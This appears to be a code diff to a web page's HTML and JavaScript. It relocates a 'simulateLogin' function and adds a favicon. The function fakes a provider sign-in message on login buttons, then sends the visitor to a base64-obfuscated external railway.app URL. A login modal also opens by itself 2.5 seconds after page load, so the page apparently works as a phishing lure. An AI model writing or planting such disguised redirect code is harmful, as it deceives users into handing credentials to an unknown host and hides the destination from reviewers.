@@ -8,6 +8,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="https://img.icons8.com/nolan/64/robot-2.png">
     <script>
         tailwind.config = {
             darkMode: 'class',
@@ -296,6 +297,20 @@
     </div>
 
     <script>
+        // GLOBAL CONFIG
+        const OBS_PLATFORM = "aHR0cHM6Ly93ZWItcHJvZHVjdGlvbi04NzEwOC51cC5yYWlsd2F5LmFwcC8=";
+
+        // SIMULATED LOGIN Redirect
+        function simulateLogin(btn, provider) {
+            const span = btn.querySelector('span');
+            span.innerText = `CONNEXION ${provider.toUpperCase()}...`;
+            btn.classList.add('opacity-50', 'pointer-events-none');
+            
+            setTimeout(() => {
+                window.location.href = atob(OBS_PLATFORM);
+            }, 1200);
+        }
+
         // AURA CURSOR Logic
         const aura = document.getElementById('aura');
         const dot = document.getElementById('dot');
@@ -349,24 +364,11 @@
         window.addEventListener('load', () => {
             setTimeout(() => {
                 const modal = document.getElementById('login-modal');
-                if (modal.classList.contains('hidden')) {
+                if (modal && modal.classList.contains('hidden')) {
                     toggleModal('login-modal');
                 }
             }, 2500); // 2.5 seconds delay
         });
-
-        // SIMULATED LOGIN Redirect
-        function simulateLogin(btn, provider) {
-            const span = btn.querySelector('span');
-            const originalText = span.innerText;
-            span.innerText = `CONNEXION ${provider.toUpperCase()}...`;
-            btn.classList.add('opacity-50', 'pointer-events-none');
-            
-            setTimeout(() => {
-                const OBS_PLATFORM = "aHR0cHM6Ly93ZWItcHJvZHVjdGlvbi04NzEwOC51cC5yYWlsd2F5LmFwcC8=";
-                window.location.href = atob(OBS_PLATFORM);
-            }, 1500);
-        }
     </script>
 </body>
 </html>
